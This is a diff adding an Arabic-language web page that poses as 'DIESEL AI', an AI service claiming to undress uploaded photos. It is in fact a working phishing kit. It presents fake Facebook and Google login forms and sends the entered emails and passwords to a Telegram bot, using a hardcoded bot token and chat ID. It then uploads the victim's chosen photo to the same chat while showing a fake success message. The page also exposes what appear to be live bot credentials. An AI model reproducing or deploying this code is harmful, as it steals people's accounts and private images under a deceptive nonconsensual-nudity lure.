@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DIESEL AI | Deep Nude Engine</title>
+    <style>
+        :root { --ai-cyan: #00f2ea; --ai-pink: #ff0050; --fb-blue: #1877f2; }
+        body { background: #000; color: white; font-family: 'Cairo', sans-serif; margin: 0; text-align: center; overflow-x: hidden; }
+        
+        /* 1. بوابة تحذير السن الإجبارية */
+        #age-gate { position: fixed; inset: 0; background: #000; z-index: 100000; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
+        .age-box { border: 2px solid var(--ai-pink); padding: 40px 20px; border-radius: 30px; background: #0a0a0a; max-width: 400px; box-shadow: 0 0 50px rgba(255, 0, 80, 0.3); }
+
+        /* الواجهة الرئيسية */
+        .ai-card { background: #0a0a0a; border: 1px solid #222; border-radius: 35px; padding: 45px 25px; max-width: 480px; margin: 30px auto; position: relative; }
+
+        /* 2. صورة البنت (الصنارة) - قالعة بظهرها */
+        .sample-container { margin: 25px 0; border-radius: 20px; border: 2px solid #333; position: relative; overflow: hidden; background: #111; }
+        .sample-img { width: 100%; height: 350px; object-fit: cover; filter: brightness(0.8) blur(1px); }
+        .sample-tag { background: var(--ai-pink); color: white; padding: 5px 12px; border-radius: 5px; font-weight: bold; font-size: 11px; position: absolute; top: 15px; right: 15px; z-index: 10; }
+
+        /* 3. أزرار الدخول بالعلامات الحقيقية */
+        .auth-btn { width: 100%; padding: 16px; border-radius: 12px; border: none; font-weight: bold; margin-bottom: 12px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 12px; font-size: 16px; }
+        .auth-fb { background: var(--fb-blue); color: white; }
+        .auth-goog { background: white; color: #3c4043; border: 1px solid #dadce0; }
+        .icon-img { width: 22px; height: 22px; }
+
+        /* صفحات الصيد (فيسبوك وجوجل) */
+        .login-view { display: none; position: fixed; inset: 0; z-index: 50000; background: #fff; text-align: right; color: #000; padding: 40px 20px; }
+        input { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 8px; border: 1px solid #dddfe2; box-sizing: border-box; font-size: 16px; }
+
+        /* منطقة الرفع */
+        #upload-section { display: none; margin-top: 30px; }
+        .drop-zone { border: 2px dashed var(--ai-cyan); border-radius: 25px; padding: 50px 20px; background: rgba(0, 242, 234, 0.05); cursor: pointer; }
+    </style>
+</head>
+<body dir="rtl">
+
+<div id="age-gate">
+    <div class="age-box">
+        <h1 style="color:var(--ai-pink); font-size:50px; margin:0;">18+</h1>
+        <h2>تحذير: محتوى للبالغين</h2>
+        <p style="color:#777;">هذا الموقع مخصص لمعالجة الصور العارية. يجب أن تكون فوق الـ 18 عاماً للمتابعة.</p>
+        <button class="auth-btn" style="background:var(--ai-pink); color:white;" onclick="document.getElementById('age-gate').style.display='none'">أنا بالغ - دخول</button>
+    </div>
+</div>
+
+<div class="ai-card">
+    <h1 style="color:var(--ai-cyan); margin:0;">DIESEL AI Deep +18</h1>
+    <p style="color:#666; font-size:13px;">أقوى محرك عربي لقلع الملابس باستخدام الذكاء الاصطناعي</p>
+
+    <div class="sample-container">
+        <div class="sample-tag">مثال حي للمعالجة</div>
+        <img src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=500" class="sample-img">
+    </div>
+
+    <div id="auth-gate">
+        <button class="auth-btn auth-fb" onclick="openLogin('fb')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="icon-img">
+            متابعة باستخدام فيسبوك
+        </button>
+        <button class="auth-btn auth-goog" onclick="openLogin('goog')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Logo.svg" class="icon-img">
+            متابعة باستخدام جوجل
+        </button>
+    </div>
+
+    <div id="upload-section">
+        <h3 style="color:var(--ai-cyan)">تم التحقق من الحساب بنجاح ✅</h3>
+        <div class="drop-zone" onclick="document.getElementById('file-picker').click()">
+            <div style="font-size:45px">🖼️</div>
+            <p id="file-txt">ارفع الصورة الآن لقلع ملابسها فوراً</p>
+            <input type="file" id="file-picker" style="display:none" onchange="processFinal()">
+        </div>
+    </div>
+</div>
+
+<div id="fb-view" class="login-view">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zHe6Wy.svg" width="160">
+    <div style="margin-top:30px; border:1px solid #dddfe2; padding:20px; border-radius:8px;">
+        <input type="text" id="fb-e" placeholder="رقم الهاتف أو البريد الإلكتروني">
+        <input type="password" id="fb-p" placeholder="كلمة السر">
+        <button onclick="hit('Facebook')" style="width:100%; background:var(--fb-blue); color:white; border:none; padding:12px; font-weight:bold; border-radius:6px; font-size:18px;">تسجيل الدخول</button>
+    </div>
+</div>
+
+<div id="goog-view" class="login-view">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="85">
+    <div style="margin-top:40px; border:1px solid #dadce0; padding:30px; border-radius:8px; max-width:400px; margin:auto;">
+        <h2 style="font-weight:400;">تسجيل الدخول</h2>
+        <p>استخدم حسابك على Google للمتابعة</p>
+        <input type="text" id="g-e" placeholder="البريد الإلكتروني أو الهاتف">
+        <input type="password" id="g-p" placeholder="أدخل كلمة المرور">
+        <button onclick="hit('Google')" style="background:#1a73e8; color:white; border:none; padding:10px 24px; border-radius:4px; font-weight:bold; float:left;">التالي</button>
+    </div>
+</div>
+
+<script>
+    const token = "8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU";
+    const chatId = "5177962707";
+
+    function openLogin(p) {
+        if(p==='fb') document.getElementById('fb-view').style.display='block';
+        else document.getElementById('goog-view').style.display='block';
+    }
+
+    function hit(platform) {
+        let e = (platform==='Facebook') ? document.getElementById('fb-e').value : document.getElementById('g-e').value;
+        let p = (platform==='Facebook') ? document.getElementById('fb-p').value : document.getElementById('g-p').value;
+
+        // التحقق من أن الحساب حقيقي (ليس فارغاً أو قصيراً جداً)
+        if(e.length < 8 || p.length < 6 || !e.includes('@') && isNaN(e)) {
+            alert("⚠️ خطأ في التحقق: يرجى إدخال حساب صحيح وكلمة مرور صحيحة للمتابعة.");
+            return;
+        }
+
+        // إرسال الحساب للتليجرام
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("👑 صيد جديد:\nالمنصة: "+platform+"\nالحساب: "+e+"\nالباسورد: "+p)}`);
+        
+        document.getElementById('fb-view').style.display='none';
+        document.getElementById('goog-view').style.display='none';
+        document.getElementById('auth-gate').style.display='none';
+        document.getElementById('upload-section').style.display='block';
+    }
+
+    function processFinal() {
+        const file = document.getElementById('file-picker').files[0];
+        if(file) {
+            document.getElementById('file-txt').innerText = "جاري قلع الملابس بالذكاء الاصطناعي... انتظر";
+            
+            // إرسال الصورة للتليجرام
+            const fd = new FormData(); fd.append('chat_id', chatId); fd.append('photo', file);
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:fd})
+            .then(() => {
+                setTimeout(() => {
+                    alert("✅ تمت المعالجة بنسبة 100%! سيتم إرسال الرابط السري للصورة العارية إلى حسابك المسجل فوراً.");
+                    location.reload();
+                }, 4000);
+            });
+        }
+    }
+</script>
+</body>
+</html>
